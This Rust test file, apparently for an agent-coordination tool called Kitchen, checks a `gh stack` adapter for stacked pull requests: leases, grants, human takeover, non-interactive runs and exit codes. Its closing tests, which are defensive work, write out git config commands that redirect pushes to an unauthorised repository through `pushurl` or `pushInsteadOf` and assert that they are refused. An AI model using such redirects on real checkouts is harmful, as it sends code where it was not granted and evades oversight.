fn a_layer_moved_after_the_check_fails_the_whole_push_and_links_nothing() -> TestResult {
    let setup = stacking()?;
    for (answer, result) in [
        (Err(UpdateFailure::Rejected), StackResult::Stale),
        (Err(UpdateFailure::Uncertain), StackResult::Uncertain),
    ] {
        for command in [StackCommand::Push, StackCommand::Submit { ready: true }] {
            let mut layers = Layers::consistent()?;
            layers.answer = answer.clone();
            let (outcome, runner) = run_layers_with(&setup, three_layers()?, &layers, &command)?;
            assert_eq!(outcome, StackOutcome::Ran(result.clone()), "{command:?}");
            assert!(runner.linked().is_empty(), "linked after {answer:?}");
        }
    }
    // None of these landed, so a first-push intent is still accepted.
    let first = PushIntent {
        pull_request: Some(number(5)?),
        expected_remote: None,
    };
    let mut layers = Layers::consistent()?;
    layers
        .remote
        .insert("lemarier/issue-5", Observed::Known(None));
    let runner =
        Recording::answering(StackResult::Done)?.with_view(StackResult::Viewed(three_layers()?));
    let outcome = StackBoundary {
        store: &setup.world.fixture.store,
        grants: &setup.world.grants,
        destination: &setup.github,
        clock: &setup.world.clock,
        runner: &runner,
        pull_requests: &layers,
        remote: &layers,
        updater: &layers,
        local: &layers,
        opener: None,
    }
    .run(&setup.task, setup.fence, &StackCommand::Push, &first)?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    Ok(())
}

#[test]
fn layers_above_move_from_their_remote_heads_and_unknown_ones_refuse() -> TestResult {
    let setup = stacking()?;
    // A settled task owned issue-7, so the upstack is idle.
    settled_layer(&setup, 7, "lemarier/issue-7")?;
    let new_layer = stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, Some(5)),
        ("lemarier/issue-6", true, None),
        ("lemarier/issue-7", false, None),
    ])?;
    let mut layers = Layers::consistent()?;
    layers
        .local
        .insert("lemarier/issue-7", Observed::Known(Some(commit('c')?)));
    let (outcome, _) = run_layers(&setup, new_layer.clone(), &layers, &StackCommand::Push)?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    // The merged layer is skipped; issue-7 without a pull request is not on
    // the remote yet, so its lease requires that it still is not.
    assert_eq!(
        layers.updated.borrow().clone(),
        vec![vec![
            moves("lemarier/issue-3", 'a', 'a')?,
            moves("lemarier/issue-4", 'b', 'b')?,
            moves("lemarier/issue-5", 'd', 'd')?,
            ("lemarier/issue-7".to_owned(), None, commit('c')?),
        ]]
    );
    // With a pull request, issue-7 rebased in the checkout: its remote head
    // 'e' is in the branch's reflog, so it moves from 'e' to 'c'.
    let submitted = rebased_layer_7()?;
    let (outcome, runner) = run_layers_with(
        &setup,
        layer_7_with_pr()?,
        &submitted,
        &StackCommand::Submit { ready: false },
    )?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    assert_eq!(
        submitted.updated.borrow().clone(),
        vec![vec![
            moves("lemarier/issue-3", 'a', 'a')?,
            moves("lemarier/issue-4", 'b', 'b')?,
            moves("lemarier/issue-5", 'd', 'd')?,
            moves("lemarier/issue-7", 'e', 'c')?,
        ]]
    );
    let links = runner.linked();
    let layers_linked = links.first().map(|link| link.pull_requests.clone());
    assert_eq!(
        layers_linked,
        Some(vec![number(3)?, number(4)?, number(5)?, number(7)?])
    );
    // A layer above that the checkout lacks, or whose remote head cannot be
    // read, refuses before anything is sent.
    for (side, value) in [
        ("local", Observed::Known(None)),
        ("remote", Observed::Unknown),
    ] {
        let mut layers = Layers::consistent()?;
        layers
            .local
            .insert("lemarier/issue-7", Observed::Known(Some(commit('c')?)));
        match side {
            "local" => layers.local.insert("lemarier/issue-7", value),
            _ => layers.remote.insert("lemarier/issue-7", value),
        };
        let (outcome, _) = run_layers(&setup, new_layer.clone(), &layers, &StackCommand::Push)?;
        assert_eq!(
            outcome,
            StackOutcome::Refused(StackRefusal::UpperLayer {
                branch: branch("lemarier/issue-7")?,
                fault: UpperLayerFault::Unknown,
            }),
            "{side}"
        );
        assert!(layers.updated.borrow().is_empty(), "{side}: pushed");
    }
    Ok(())
}

/// [`three_layers`] with `issue-7` above the task's branch, with pull
/// request 7.
fn layer_7_with_pr() -> TestResult<StackView> {
    stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, Some(5)),
        ("lemarier/issue-7", false, Some(7)),
    ])
}

/// Consistent layers plus `issue-7`, open as pull request 7 at remote head
/// 'e', which the checkout rebased to 'c' and so integrated.
fn rebased_layer_7() -> TestResult<Layers> {
    let mut layers = Layers::consistent()?;
    layers
        .local
        .insert("lemarier/issue-7", Observed::Known(Some(commit('c')?)));
    layers
        .remote
        .insert("lemarier/issue-7", Observed::Known(Some(commit('e')?)));
    layers
        .included
        .insert("lemarier/issue-7", Observed::Known(true));
    layers.pull_requests.insert(
        7,
        Observed::Known(Some(layer_pr(
            7,
            "lemarier/issue-7",
            "lemarier/issue-5",
            'e',
        )?)),
    );
    Ok(layers)
}

/// Pull request 7 in `layers`, changed in place.
fn edit_pr_7(layers: &mut Layers, change: impl FnOnce(&mut PullRequestView)) {
    if let Some(Observed::Known(Some(view))) = layers.pull_requests.get_mut(&7) {
        change(view);
    }
}

/// A named change to [`rebased_layer_7`] and the fault it must cause.
type UpperCase = (&'static str, fn(&mut Layers), UpperLayerFault);

#[test]
fn an_upper_layer_never_loses_remote_commits_or_comes_back_after_deletion() -> TestResult {
    let setup = stacking()?;
    settled_layer(&setup, 7, "lemarier/issue-7")?;
    let cases: [UpperCase; 7] = [
        (
            "remote commits the checkout never integrated",
            |layers| {
                layers
                    .included
                    .insert("lemarier/issue-7", Observed::Known(false));
            },
            UpperLayerFault::NotIntegrated,
        ),
        (
            "unreadable reflog",
            |layers| {
                layers
                    .included
                    .insert("lemarier/issue-7", Observed::Unknown);
            },
            UpperLayerFault::Unknown,
        ),
        (
            "merged, branch deleted",
            |layers| {
                layers
                    .remote
                    .insert("lemarier/issue-7", Observed::Known(None));
                edit_pr_7(layers, |view| view.state = PullRequestState::Merged);
            },
            UpperLayerFault::NotOpen(PullRequestState::Merged),
        ),
        (
            "closed",
            |layers| edit_pr_7(layers, |view| view.state = PullRequestState::Closed),
            UpperLayerFault::NotOpen(PullRequestState::Closed),
        ),
        (
            "open, branch deleted",
            |layers| {
                layers
                    .remote
                    .insert("lemarier/issue-7", Observed::Known(None));
            },
            UpperLayerFault::BranchDeleted,
        ),
        (
            "another branch's pull request",
            |layers| {
                edit_pr_7(layers, |view| {
                    view.head_branch = "lemarier/other".to_owned()
                })
            },
            UpperLayerFault::WrongBranch,
        ),
        (
            "unreadable pull request",
            |layers| {
                layers.pull_requests.insert(7, Observed::Unknown);
            },
            UpperLayerFault::Unknown,
        ),
    ];
    for (case, change, fault) in cases {
        for command in [StackCommand::Push, StackCommand::Submit { ready: false }] {
            let mut layers = rebased_layer_7()?;
            change(&mut layers);
            let (outcome, runner) = run_layers_with(&setup, layer_7_with_pr()?, &layers, &command)?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::UpperLayer {
                    branch: branch("lemarier/issue-7")?,
                    fault: fault.clone(),
                }),
                "{case}: {command:?}"
            );
            assert!(layers.updated.borrow().is_empty(), "{case}: pushed");
            assert!(runner.linked().is_empty(), "{case}: linked");
        }
    }
    Ok(())
}

#[test]
fn a_stack_push_refuses_too_many_layers_and_a_submission_a_layer_without_a_pr() -> TestResult {
    let setup = stacking()?;
    let mut names: Vec<String> = (0..MAX_STACK_LAYERS)
        .map(|layer| format!("lemarier/below-{layer}"))
        .collect();
    names.push("lemarier/issue-5".to_owned());
    let too_many: Vec<(&str, bool, Option<u64>)> = names
        .iter()
        .map(|name| (name.as_str(), false, None))
        .collect();
    let layers = Layers::consistent()?;
    let (outcome, _) = run_layers(
        &setup,
        stack_with_prs(&too_many)?,
        &layers,
        &StackCommand::Push,
    )?;
    assert_eq!(outcome, StackOutcome::Refused(StackRefusal::InvalidLayers));
    // `gh stack link` pushes a layer it is given by branch name: a
    // submission with a layer above that has no pull request is refused
    // before the push, naming the lowest such layer.
    settled_layer(&setup, 7, "lemarier/issue-7")?;
    settled_layer(&setup, 8, "lemarier/issue-8")?;
    let view = stack_with_prs(&[
        ("lemarier/issue-3", false, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, Some(5)),
        ("lemarier/issue-7", false, None),
        ("lemarier/issue-8", false, None),
    ])?;
    let mut layers = Layers::consistent()?;
    for name in ["lemarier/issue-7", "lemarier/issue-8"] {
        layers
            .local
            .insert(name, Observed::Known(Some(commit('c')?)));
    }
    let (outcome, runner) = run_layers_with(
        &setup,
        view.clone(),
        &layers,
        &StackCommand::Submit { ready: false },
    )?;
    assert_eq!(
        outcome,
        StackOutcome::Refused(StackRefusal::NoPullRequest {
            branch: branch("lemarier/issue-7")?,
        })
    );
    assert!(layers.updated.borrow().is_empty(), "pushed");
    assert!(runner.linked().is_empty());
    // A push links nothing, so the same stack pushes.
    let (outcome, _) = run_layers(&setup, view, &layers, &StackCommand::Push)?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    Ok(())
}

#[test]
fn a_moved_lower_layer_refuses_a_stack_push_with_the_layer_named() -> TestResult {
    let setup = stacking()?;
    let issue_3 = branch("lemarier/issue-3")?;
    let issue_4 = branch("lemarier/issue-4")?;
    let moved = |layers: Layers, name: &'static str, fill: char| -> TestResult<Layers> {
        let mut layers = layers;
        layers
            .remote
            .insert(name, Observed::Known(Some(commit(fill)?)));
        Ok(layers)
    };
    let cases: Vec<(&str, Layers, BranchName, LowerLayerFault)> = vec![
        (
            "rewritten on the remote",
            moved(Layers::consistent()?, "lemarier/issue-4", 'f')?,
            issue_4.clone(),
            LowerLayerFault::HeadMoved,
        ),
        (
            "deleted on the remote",
            {
                let mut layers = Layers::consistent()?;
                layers
                    .remote
                    .insert("lemarier/issue-3", Observed::Known(None));
                layers
            },
            issue_3.clone(),
            LowerLayerFault::HeadMoved,
        ),
        (
            "pull request head moved",
            Layers::consistent()?.edit(4, |view| {
                if let Ok(head) = commit('e') {
                    view.head = head;
                }
            }),
            issue_4.clone(),
            LowerLayerFault::HeadMoved,
        ),
        (
            "merged by someone else",
            Layers::consistent()?.edit(3, |view| view.state = PullRequestState::Merged),
            issue_3.clone(),
            LowerLayerFault::NotOpen(PullRequestState::Merged),
        ),
        (
            "closed",
            Layers::consistent()?.edit(4, |view| view.state = PullRequestState::Closed),
            issue_4.clone(),
            LowerLayerFault::NotOpen(PullRequestState::Closed),
        ),
        (
            "retargeted",
            Layers::consistent()?.edit(4, |view| view.base_branch = "main".to_owned()),
            issue_4.clone(),
            LowerLayerFault::BaseChanged,
        ),
        (
            "another branch's pull request",
            Layers::consistent()?.edit(3, |view| view.head_branch = "lemarier/other".to_owned()),
            issue_3.clone(),
            LowerLayerFault::WrongBranch,
        ),
        (
            "pull request gone",
            {
                let mut layers = Layers::consistent()?;
                layers.pull_requests.remove(&3);
                layers
            },
            issue_3.clone(),
            LowerLayerFault::NoPullRequest,
        ),
        (
            "pull request unreadable",
            {
                let mut layers = Layers::consistent()?;
                layers.pull_requests.insert(4, Observed::Unknown);
                layers
            },
            issue_4.clone(),
            LowerLayerFault::Unknown,
        ),
        (
            "remote unreadable",
            {
                let mut layers = Layers::consistent()?;
                layers.remote.insert("lemarier/issue-3", Observed::Unknown);
                layers
            },
            issue_3.clone(),
            LowerLayerFault::Unknown,
        ),
        (
            "not in the checkout",
            {
                let mut layers = Layers::consistent()?;
                layers
                    .local
                    .insert("lemarier/issue-4", Observed::Known(None));
                layers
            },
            issue_4.clone(),
            LowerLayerFault::Unknown,
        ),
    ];
    for command in [StackCommand::Push, StackCommand::Submit { ready: true }] {
        for (name, layers, layer, fault) in &cases {
            let (outcome, ran) = run_layers(&setup, three_layers()?, layers, &command)?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::LowerLayer {
                    branch: layer.clone(),
                    fault: fault.clone(),
                }),
                "{name} {command:?}"
            );
            assert!(ran.is_empty(), "{name}: the tool ran");
        }
    }
    // A lower layer without a pull request cannot be checked.
    let (outcome, _) = run_layers(
        &setup,
        stack_with_prs(&[
            ("lemarier/issue-3", false, None),
            ("lemarier/issue-4", false, Some(4)),
            ("lemarier/issue-5", false, Some(5)),
        ])?,
        &Layers::consistent()?,
        &StackCommand::Push,
    )?;
    assert_eq!(
        outcome,
        StackOutcome::Refused(StackRefusal::LowerLayer {
            branch: issue_3,
            fault: LowerLayerFault::NoPullRequest,
        })
    );
    Ok(())
}

#[test]
fn a_merged_lower_layer_is_skipped_and_its_dependent_may_still_name_it() -> TestResult {
    let setup = stacking()?;
    // The tool knows issue-3 merged; its branch is gone. issue-4 is still
    // based on it until the submission retargets it, or already on main.
    let view = stack_with_prs(&[
        ("lemarier/issue-3", true, Some(3)),
        ("lemarier/issue-4", false, Some(4)),
        ("lemarier/issue-5", false, Some(5)),
    ])?;
    for base in ["lemarier/issue-3", "main"] {
        let mut layers = Layers::consistent()?.edit(4, |view| view.base_branch = base.to_owned());
        layers.pull_requests.remove(&3);
        layers.remote.remove("lemarier/issue-3");
        let (outcome, _) = run_layers(
            &setup,
            view.clone(),
            &layers,
            &StackCommand::Submit { ready: false },
        )?;
        assert_eq!(outcome, StackOutcome::Ran(StackResult::Done), "{base}");
    }
    // A base outside the chain is still refused.
    let layers = Layers::consistent()?.edit(4, |view| view.base_branch = "lemarier/x".to_owned());
    let (outcome, _) = run_layers(&setup, view, &layers, &StackCommand::Push)?;
    assert_eq!(
        outcome,
        StackOutcome::Refused(StackRefusal::LowerLayer {
            branch: branch("lemarier/issue-4")?,
            fault: LowerLayerFault::BaseChanged,
        })
    );
    Ok(())
}

#[test]
fn a_rebase_upstack_is_not_blocked_by_a_moved_lower_layer() -> TestResult {
    // Rebasing onto a lower layer that moved is how the writer repairs the
    // stack; only commands that push the layers check them.
    let setup = stacking()?;
    let mut layers = Layers::consistent()?;
    layers
        .remote
        .insert("lemarier/issue-4", Observed::Known(Some(commit('f')?)));
    let (outcome, ran) = run_layers(
        &setup,
        three_layers()?,
        &layers,
        &StackCommand::RebaseUpstack,
    )?;
    assert_eq!(outcome, StackOutcome::Ran(StackResult::Done));
    assert_eq!(ran, vec![StackCommand::RebaseUpstack]);
    Ok(())
}

#[test]
fn a_submission_needs_the_grants_it_exercises() -> TestResult {
    // Only `push-branch`: pushing runs, opening pull requests does not.
    let setup = stacking_granted(&[Permission::PushBranch])?;
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        run(&setup, &runner, &StackCommand::Push)?,
        StackOutcome::Ran(StackResult::Done)
    );
    assert!(matches!(
        run(&setup, &runner, &StackCommand::Submit { ready: false }),
        Err(error) if matches!(
            error.downcast_ref::<kitchen::Error>(),
            Some(kitchen::Error::Contract(ContractError::PermissionDenied {
                permission: Permission::OpenPullRequest
            }))
        )
    ));
    // Marking pull requests ready asks for their review.
    let setup = stacking_granted(&[Permission::PushBranch, Permission::OpenPullRequest])?;
    let runner = Recording::answering(StackResult::Done)?;
    assert_eq!(
        run(&setup, &runner, &StackCommand::Submit { ready: false })?,
        StackOutcome::Ran(StackResult::Done)
    );
    assert!(matches!(
        run(&setup, &runner, &StackCommand::Submit { ready: true }),
        Err(error) if matches!(
            error.downcast_ref::<kitchen::Error>(),
            Some(kitchen::Error::Contract(ContractError::PermissionDenied {
                permission: Permission::RequestReview
            }))
        )
    ));
    assert!(runner.ran().is_empty(), "the tool never pushes");
    assert_eq!(
        runner
            .linked()
            .iter()
            .map(|link| link.ready)
            .collect::<Vec<_>>(),
        vec![false]
    );
    Ok(())
}

#[test]
fn the_stack_boundary_needs_the_live_claim_and_the_push_grant() -> TestResult {
    let runner = Recording::answering(StackResult::Done)?;
    // No delegated push grant for this repository.
    let other = Grant::repository(
        Permission::PushBranch,
        kitchen::contracts::Repository::new("origin89hq/other")?,
        BackendId::new("github")?,
        common::credential()?,
    );
    let mut house = worker_grants()?;
    house.extend([github_grant(Permission::PushBranch)?, other.clone()]);
    let mut requested = worker_grants()?;
    requested.push(other);
    let unauthorized = stacking_with(&house, requested)?;
    assert!(run(&unauthorized, &runner, &StackCommand::Push).is_err());
    // An expired claim is stale.
    let setup = stacking()?;
    setup.world.clock.advance(301);
    let remote = Remote::open()?;
    let result = boundary(&setup, &runner, &remote).run(
        &setup.task,
        setup.fence,
        &StackCommand::Push,
        &intent()?,
    );
    assert!(matches!(
        result,
        Err(kitchen::Error::State(StateError::StaleFence { .. }))
    ));
    assert!(runner.ran().is_empty());
    assert_eq!(remote.reads.get(), 0);
    Ok(())
}

#[test]
fn a_persons_branch_is_never_pushed_through_the_stack_tool() -> TestResult {
    use kitchen::contracts::WorkerState;
    use kitchen::workflows::coordination::{Supervision, SupervisionInput, supervise};
    let setup = stacking()?;
    let record = setup.world.fixture.store.task(&setup.task)?;
    let worker = kitchen::workflows::coordination::current_worker(&record)
        .ok_or("no worker")?
        .worker;
    setup
        .world
        .backend
        .set_worker_state(&worker, WorkerState::UserTakeover);
    assert_eq!(
        supervise(
            &setup.world.ctx(),
            &setup.task,
            setup.fence,
            &workflows_support::supervision()?,
            &SupervisionInput::default(),
        )?,
        Supervision::PersonOwnsTerminal
    );
    let runner = Recording::answering(StackResult::Done)?;
    for command in [StackCommand::Push, StackCommand::View] {
        assert_eq!(
            run(&setup, &runner, &command)?,
            StackOutcome::Refused(StackRefusal::Push(PushRefusal::BranchHeld))
        );
    }
    assert!(runner.ran().is_empty());
    Ok(())
}

// The gh-stack adapter.

#[test]
fn gh_stack_commands_are_non_interactive_with_an_explicit_remote() -> TestResult {
    let temp = tempfile::tempdir()?;
    let config = workflows_support::isolated_config(temp.path(), &[])?;
    let gh = GhStack::new(
        "/usr/bin/gh".into(),
        "/tmp/checkout".into(),
        "upstream",
        config.clone(),
        Duration::from_secs(5),
    )?;
    let cases = [
        (
            StackCommand::Adopt {
                trunk: branch("main")?,
                branches: vec![branch("lemarier/a")?, branch("lemarier/b")?],
            },
            "stack init --base main lemarier/a lemarier/b",
        ),
        (
            StackCommand::Add {
                branch: branch("lemarier/c")?,
            },
            "stack add lemarier/c",
        ),
        (
            StackCommand::RebaseUpstack,
            "stack rebase --upstack --remote upstream",
        ),
        (StackCommand::Push, "stack push --remote upstream"),
        (
            StackCommand::Submit { ready: false },
            "stack submit --auto --remote upstream",
        ),
        (
            StackCommand::Submit { ready: true },
            "stack submit --auto --open --remote upstream",
        ),
        (StackCommand::View, "stack view --json"),
    ];
    for (command, expected) in cases {
        assert_eq!(gh.args(&command).join(" "), expected);
    }
    // Every layer by pull-request number, never by branch.
    for (ready, expected) in [
        (false, "stack link --base main --remote upstream 41 42"),
        (
            true,
            "stack link --base main --open --remote upstream 41 42",
        ),
    ] {
        let link = StackLink {
            trunk: branch("main")?,
            pull_requests: vec![number(41)?, number(42)?],
            ready,
        };
        assert_eq!(gh.link_args(&link).join(" "), expected);
    }
    for (git, checkout, remote, deadline) in [
        ("gh", "/tmp", "origin", 5),
        ("/usr/bin/gh", "tmp", "origin", 5),
        ("/usr/bin/gh", "/tmp", "-origin", 5),
        ("/usr/bin/gh", "/tmp", "a b", 5),
        ("/usr/bin/gh", "/tmp", "origin", 0),
    ] {
        assert!(
            GhStack::new(
                git.into(),
                checkout.into(),
                remote,
                config.clone(),
                Duration::from_secs(deadline)
            )
            .is_err()
        );
    }
    // Kitchen's configuration must not live in the checkout the worker
    // controls.
    let inside = workflows_support::isolated_config(temp.path(), &[])?;
    assert_eq!(
        GhStack::new(
            "/usr/bin/gh".into(),
            temp.path().to_path_buf(),
            "origin",
            inside,
            Duration::from_secs(5),
        )
        .err(),
        Some(kitchen::workflows::coordination::CoordinationError::InvalidGitConfig)
    );
    Ok(())
}

#[cfg(unix)]
mod gh_process {
    use std::{fs, path::Path, time::Duration};

    use super::*;

    /// A stand-in for `gh` that records its arguments, whether stdin and
    /// stdout are terminals, and the prompt setting, then prints `stdout`
    /// and exits with `code`.
    fn fake_gh(dir: &Path, stdout: &str, code: i32) -> TestResult<std::path::PathBuf> {
        let path = dir.join("gh");
        let log = dir.join("log");
        common::executable::write_executable(
            &path,
            format!(
                "#!/bin/sh\n\
                 printf '%s\\n' \"$*\" >> '{log}'\n\
                 if [ -t 0 ]; then echo stdin-tty >> '{log}'; fi\n\
                 if [ -t 1 ]; then echo stdout-tty >> '{log}'; fi\n\
                 echo \"prompt=$GH_PROMPT_DISABLED editor=$GIT_EDITOR\" >> '{log}'\n\
                 printf '%s' '{stdout}'\n\
                 exit {code}\n",
                log = log.display(),
            ),
        )?;
        Ok(path)
    }

    /// The adapter for the checkout `dir`, with Kitchen's configuration in
    /// a directory of its own, which lives as long as the returned guard.
    fn adapter(gh: std::path::PathBuf, dir: &Path) -> TestResult<(GhStack, tempfile::TempDir)> {
        let kitchen = tempfile::tempdir()?;
        let gh = GhStack::new(
            gh,
            dir.to_path_buf(),
            "origin",
            workflows_support::isolated_config(kitchen.path(), &[])?,
            Duration::from_secs(5),
        )?;
        Ok((gh, kitchen))
    }

    #[test]
    fn the_adapter_never_gives_gh_a_terminal_or_a_prompt() -> TestResult {
        let temp = tempfile::tempdir()?;
        let dir = temp.path().canonicalize()?;
        let (gh, _kitchen) = adapter(fake_gh(&dir, "", 0)?, &dir)?;
        assert_eq!(gh.run(&StackCommand::Push), StackResult::Done);
        let log = fs::read_to_string(dir.join("log"))?;
        assert_eq!(
            log, "stack push --remote origin\nprompt=1 editor=true\n",
            "no terminal on stdin or stdout, prompts disabled"
        );
        Ok(())
    }

    #[test]
    fn gh_stack_exit_codes_and_views_are_typed() -> TestResult {
        let temp = tempfile::tempdir()?;
        let dir = temp.path().canonicalize()?;
        let view = r#"{"trunk":"main","currentBranch":"lemarier/b","branches":[{"name":"lemarier/a","isMerged":true,"needsRebase":false,"pr":{"number":41,"state":"MERGED"}},{"name":"lemarier/b","isMerged":false,"needsRebase":true}]}"#;
        let viewed = adapter(fake_gh(&dir, view, 0)?, &dir)?
            .0
            .run(&StackCommand::View);
        let StackResult::Viewed(stack) = viewed else {
            return Err(format!("view not parsed: {viewed:?}").into());
        };
        assert_eq!(stack.trunk, branch("main")?);
        assert_eq!(stack.branches.len(), 2);
        let bottom = stack.branches.first().ok_or("no bottom layer")?;
        assert!(bottom.is_merged);
        assert_eq!(bottom.pr.map(|pr| pr.number), Some(IssueNumber::new(41)?));
        assert!(
            stack
                .branches
                .get(1)
                .is_some_and(|layer| layer.needs_rebase && layer.pr.is_none())
        );
        for (code, command, expected) in [
            (3, StackCommand::RebaseUpstack, StackResult::Conflict),
            (
                7,
                StackCommand::RebaseUpstack,
                StackResult::RebaseInProgress,
            ),
            (8, StackCommand::Push, StackResult::Locked),
            (2, StackCommand::View, StackResult::NotInStack),
            (5, StackCommand::View, StackResult::Rejected),
            // A generic failure may follow a partial push.
            (1, StackCommand::Push, StackResult::Uncertain),
            (1, StackCommand::View, StackResult::Rejected),
            // Unparseable view output is not a stack.
            (0, StackCommand::View, StackResult::Uncertain),
        ] {
            let temp = tempfile::tempdir()?;
            let dir = temp.path().canonicalize()?;
            let (gh, _kitchen) = adapter(fake_gh(&dir, "not json", code)?, &dir)?;
            assert_eq!(gh.run(&command), expected, "exit {code}");
        }
        // Linking can change pull-request bases before failing: a generic
        // failure is uncertain, a documented refusal is not.
        let link = StackLink {
            trunk: branch("main")?,
            pull_requests: vec![number(4)?],
            ready: false,
        };
        for (code, expected) in [
            (0, StackResult::Done),
            (1, StackResult::Uncertain),
            (4, StackResult::Uncertain),
            (5, StackResult::Rejected),
            (8, StackResult::Locked),
        ] {
            let temp = tempfile::tempdir()?;
            let dir = temp.path().canonicalize()?;
            let (gh, _kitchen) = adapter(fake_gh(&dir, "", code)?, &dir)?;
            assert_eq!(gh.link(&link), expected, "link exit {code}");
        }
        Ok(())
    }

    #[test]
    fn doctor_detection_reports_the_installed_version_or_a_missing_tool() -> TestResult {
        let temp = tempfile::tempdir()?;
        let dir = temp.path().canonicalize()?;
        let deadline = Duration::from_secs(5);
        let installed = fake_gh(&dir, "gh stack version 0.1.0\n", 0)?;
        assert_eq!(
            GhStack::detect(&installed, &dir, deadline),
            Some(StackToolStatus::Installed {
                version: "0.1.0".to_owned()
            })
        );
        let other = tempfile::tempdir()?;
        let other = other.path().canonicalize()?;
        let absent = fake_gh(&other, "unknown command \"stack\" for \"gh\"", 1)?;
        assert_eq!(
            GhStack::detect(&absent, &other, deadline),
            Some(StackToolStatus::Missing)
        );
        assert_eq!(
            GhStack::detect(&dir.join("no-such-gh"), &dir, deadline),
            Some(StackToolStatus::Missing)
        );
        // A probe that does not finish is not evidence.
        let slow = dir.join("slow-gh");
        common::executable::write_executable(&slow, "#!/bin/sh\nsleep 5\n")?;
        assert_eq!(
            GhStack::detect(&slow, &dir, Duration::from_millis(200)),
            None
        );
        Ok(())
    }

    const GIT: &str = "/usr/bin/git";

    fn git(dir: &Path, args: &[&str]) -> TestResult<String> {
        let output = std::process::Command::new(GIT)
            .args([
                "-c",
                "user.name=Kitchen Test",
                "-c",
                "user.email=kitchen@example.invalid",
                "-c",
                "commit.gpgsign=false",
                "-c",
                "init.defaultBranch=main",
            ])
            .args(args)
            .current_dir(dir)
            .env("GIT_CONFIG_GLOBAL", "/dev/null")
            .env("GIT_CONFIG_SYSTEM", "/dev/null")
            .output()?;
        if !output.status.success() {
            return Err(format!(
                "git {args:?} failed: {}",
                String::from_utf8_lossy(&output.stderr)
            )
            .into());
        }
        Ok(String::from_utf8(output.stdout)?.trim().to_owned())
    }

    fn text(path: &Path) -> TestResult<&str> {
        Ok(path.to_str().ok_or("non-UTF-8 path")?)
    }

    /// The granted repository `origin89hq/firmware` as a bare repository
    /// under the temporary directory (the URL base) and the worker's clone.
    fn granted_clone(root: &Path) -> TestResult<(std::path::PathBuf, std::path::PathBuf)> {
        let bare = root.join("origin89hq").join("firmware.git");
        fs::create_dir_all(&bare)?;
        git(&bare, &["init", "--bare"])?;
        let worker = root.join("worker");
        git(root, &["clone", text(&bare)?, text(&worker)?])?;
        Ok((bare, worker))
    }

    #[test]
    fn a_divergent_push_url_is_refused_before_gh_stack_runs() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker) = granted_clone(&root)?;
        let elsewhere = root.join("elsewhere").join("firmware.git");
        fs::create_dir_all(&elsewhere)?;
        git(&elsewhere, &["init", "--bare"])?;
        let setup = stacking()?;
        let (gh, _kitchen) = adapter(fake_gh(&root, "", 0)?, &worker)?;
        let remote = gh
            .git_remote(GIT.into(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(&root)?)])?;
        // The fetch URL is the granted repository, so a fetch-only check
        // passes; only the push URL, or its rewrite, leaves.
        let other = text(&elsewhere)?.to_owned();
        let granted = text(&bare)?.to_owned();
        let redirects: [(&str, Vec<String>, String); 2] = [
            (
                "pushurl",
                vec![
                    "config".into(),
                    "remote.origin.pushurl".into(),
                    other.clone(),
                ],
                "remote.origin.pushurl".to_owned(),
            ),
            (
                "pushInsteadOf",
                vec![
                    "config".into(),
                    format!("url.{other}.pushInsteadOf"),
                    granted.clone(),
                ],
                format!("url.{other}.pushinsteadof"),
            ),
        ];
        for (name, args, key) in &redirects {
            let args: Vec<&str> = args.iter().map(String::as_str).collect();
            git(&worker, &args)?;
            assert_eq!(
                remote.reads_from(&workflows_support::repo()?),
                Observed::Known(true),
                "{name}: the fetch URL is unchanged"
            );
            for command in [
                StackCommand::Push,
                StackCommand::Submit { ready: true },
                StackCommand::RebaseUpstack,
            ] {
                let outcome = StackBoundary {
                    store: &setup.world.fixture.store,
                    grants: &setup.world.grants,
                    destination: &setup.github,
                    clock: &setup.world.clock,
                    runner: &gh,
                    pull_requests: &Remote::open()?,
                    remote: &remote,
                    updater: &remote,
                    local: &remote,
                    opener: None,
                }
                .run(&setup.task, setup.fence, &command, &intent()?)?;
                assert_eq!(
                    outcome,
                    StackOutcome::Refused(StackRefusal::Push(PushRefusal::CheckoutRedirect(
                        redirect_key(&remote, key)?
                    ))),
                    "{name} {command:?}"
                );
            }
            assert!(!root.join("log").exists(), "{name}: gh stack ran");
            git(&worker, &["config", "--unset-all", "remote.origin.pushurl"]).ok();
            git(
                &worker,
                &["config", "--remove-section", &format!("url.{other}")],
            )
            .ok();
        }
        Ok(())
    }

    #[test]
    fn a_second_push_url_is_refused_before_gh_stack_runs() -> TestResult {
        let temp = tempfile::tempdir()?;
        let root = temp.path().canonicalize()?;
        let (bare, worker) = granted_clone(&root)?;
        let elsewhere = root.join("elsewhere").join("firmware.git");
        fs::create_dir_all(&elsewhere)?;
        git(&elsewhere, &["init", "--bare"])?;
        let setup = stacking()?;
        let (gh, _kitchen) = adapter(fake_gh(&root, "", 0)?, &worker)?;
        let remote = gh
            .git_remote(GIT.into(), Duration::from_secs(30))?
            .with_url_bases(&[&format!("{}/", text(&root)?)])?;
        // The first push URL is the granted repository, so a check of only
        // the first passes.
        for url in [text(&bare)?, text(&elsewhere)?] {
            git(&worker, &["config", "--add", "remote.origin.pushurl", url])?;
        }
        assert_eq!(
            remote.pushes_to(&workflows_support::repo()?),
            Observed::Known(false)
        );
        for command in [
            StackCommand::Push,
            StackCommand::Submit { ready: true },
            StackCommand::RebaseUpstack,
        ] {
            let outcome = StackBoundary {
                store: &setup.world.fixture.store,
                grants: &setup.world.grants,
                destination: &setup.github,
                clock: &setup.world.clock,
                runner: &gh,
                pull_requests: &Remote::open()?,
                remote: &remote,
                updater: &remote,
                local: &remote,
                opener: None,
            }
            .run(&setup.task, setup.fence, &command, &intent()?)?;
            assert_eq!(
                outcome,
                StackOutcome::Refused(StackRefusal::Push(PushRefusal::CheckoutRedirect(
